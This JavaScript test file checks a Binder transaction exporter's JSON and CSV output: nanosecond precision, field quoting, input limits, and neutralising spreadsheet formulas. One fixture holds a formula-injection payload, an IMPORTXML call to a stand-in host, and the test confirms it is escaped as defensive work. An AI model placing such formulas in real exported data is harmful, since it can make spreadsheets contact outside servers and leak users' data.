import {test} from 'node:test';
import assert from 'node:assert/strict';
import {binderTransactionsCsv,binderTransactionsJson} from '../public/binder-export.js';

const transactions=[{tsNs:'1730000000000000000',durationNs:'2500000',client:'app.client',clientTid:'42',server:'system_server',serverTid:'8',aidl:'android.example.IFoo',sync:true,serverTsNs:'1730000000001000000',serverDurationNs:'1500000',id:'9007199254740993'}];

test('Binder JSON export preserves nanosecond precision, direction and truncation metadata',()=>{
 const data=JSON.parse(binderTransactionsJson({transactions,packageName:'com.example.app',direction:'client',truncated:true},{traceFileName:'capture.perfetto-trace'}));
 assert.equal(data.kind,'perfetto-binder-transactions');assert.equal(data.traceFileName,'capture.perfetto-trace');assert.equal(data.packageName,'com.example.app');assert.equal(data.direction,'client');assert.equal(data.truncated,true);assert.equal(data.count,1);assert.equal(data.transactions[0].tsNs,transactions[0].tsNs);assert.equal(data.transactions[0].id,transactions[0].id);
});

test('Binder CSV export quotes fields, protects spreadsheet formulas and keeps nanoseconds as text',()=>{
 const csv=binderTransactionsCsv([{...transactions[0],client:'=IMPORTXML("https://bad.test","//x")'}]);
 assert.ok(csv.startsWith('\uFEFF"client_timestamp_ns"'));
 assert.ok(csv.includes("'=IMPORTXML("));
 assert.ok(csv.includes('"1730000000000000000"'));
 assert.ok(csv.includes('"9007199254740993"'));
});

test('Binder report exporters reject oversized and invalid values',()=>{
 assert.throws(()=>binderTransactionsCsv(Array(501).fill(transactions[0])),/超过导出限制/);
 assert.throws(()=>binderTransactionsJson({direction:'invalid',transactions}),/结果无效/);
 assert.throws(()=>binderTransactionsCsv([{...transactions[0],durationNs:'-1'}]),/耗时无效/);
});
